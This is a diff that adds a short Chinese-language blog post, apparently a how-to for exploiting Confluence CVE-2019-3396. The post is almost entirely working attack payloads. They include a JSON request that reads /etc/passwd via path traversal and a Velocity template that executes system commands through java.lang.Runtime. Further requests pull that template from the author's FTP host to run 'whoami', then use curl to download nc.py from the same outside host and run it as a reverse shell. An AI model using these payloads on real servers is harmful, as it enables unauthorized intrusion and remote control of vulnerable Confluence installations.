@@ -1,0 +1,36 @@
+<h2 id="confluence未授权rce-cve-2019-3396">Confluence未授权RCE (CVE-2019-3396)</h2>
+<p>文件读取：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url:/confluence/rest/tinymce/1/macro/preview
+
+<span class="o">{</span><span class="s2">"contentId"</span>:<span class="s2">"786457"</span>,<span class="s2">"macro"</span>:<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"widget"</span>,<span class="s2">"body"</span>:<span class="s2">""</span>,<span class="s2">"params"</span>:<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https://www.viddler.com/v/23464dc5"</span>,<span class="s2">"width"</span>:<span class="s2">"1000"</span>,<span class="s2">"height"</span>:<span class="s2">"1000"</span>,<span class="s2">"_template"</span>:<span class="s2">"../../../../../etc/passwd"</span><span class="o">}}}</span>
+</code></pre></div></div>
+
+<h3 id="rce漏洞">RCE漏洞：</h3>
+<p>生成<code class="language-plaintext highlighter-rouge">cmd.vm</code>文件放在自己的服务器上。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>cmd.vm
+<span class="c">#set ($e="exp")</span>
+<span class="c">#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))</span>
+<span class="c">#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))</span>
+<span class="c">#set($sc = $e.getClass().forName("java.util.Scanner"))</span>
+<span class="c">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))</span>
+<span class="c">#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))</span>
+<span class="c">#if($scan.hasNext())</span>
+    <span class="nv">$scan</span>.next<span class="o">()</span>
+<span class="c">#end</span>
+</code></pre></div></div>
+<p>这个漏洞是相当于一个远程文件包含的原理，所以下面跑一个ftp然后在post包里包含，最后输出cmd执行命令即可。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">-p</span> 2121
+<span class="o">[</span>I 2020-07-23 15:47:58] concurrency model: async
+<span class="o">[</span>I 2020-07-23 15:47:58] masquerade <span class="o">(</span>NAT<span class="o">)</span> address: None
+<span class="o">[</span>I 2020-07-23 15:47:58] passive ports: None
+<span class="o">[</span>I 2020-07-23 15:47:58] <span class="o">&gt;&gt;&gt;</span> starting FTP server on 0.0.0.0:2121, <span class="nv">pid</span><span class="o">=</span>25460 <span class="o">&lt;&lt;&lt;</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>执行命令：
+<span class="o">{</span><span class="s2">"contentId"</span>:<span class="s2">"786457"</span>,<span class="s2">"macro"</span>:<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"widget"</span>,<span class="s2">"body"</span>:<span class="s2">""</span>,<span class="s2">"params"</span>:<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https://www.viddler.com/v/23464dc5"</span>,<span class="s2">"width"</span>:<span class="s2">"1000"</span>,<span class="s2">"height"</span>:<span class="s2">"1000"</span>,<span class="s2">"_template"</span>:<span class="s2">"ftp://www.chihou.pro:2121/cmd.vm"</span>,<span class="s2">"cmd"</span>:<span class="s2">"whoami"</span><span class="o">}}}</span>
+
+下载shell反弹：
+<span class="o">{</span><span class="s2">"contentId"</span>:<span class="s2">"786457"</span>,<span class="s2">"macro"</span>:<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"widget"</span>,<span class="s2">"body"</span>:<span class="s2">""</span>,<span class="s2">"params"</span>:<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https://www.viddler.com/v/23464dc5"</span>,<span class="s2">"width"</span>:<span class="s2">"1000"</span>,<span class="s2">"height"</span>:<span class="s2">"1000"</span>,<span class="s2">"_template"</span>:<span class="s2">"ftp://www.chihou.pro:2121/cmd.vm"</span>,<span class="s2">"cmd"</span>:<span class="s2">"curl -o /tmp/nc.py ftp://www.chihou.pro:2121/nc.py"</span><span class="o">}}}</span>
+
+<span class="s2">"python /tmp/nc.py"</span>
+</code></pre></div></div>
+
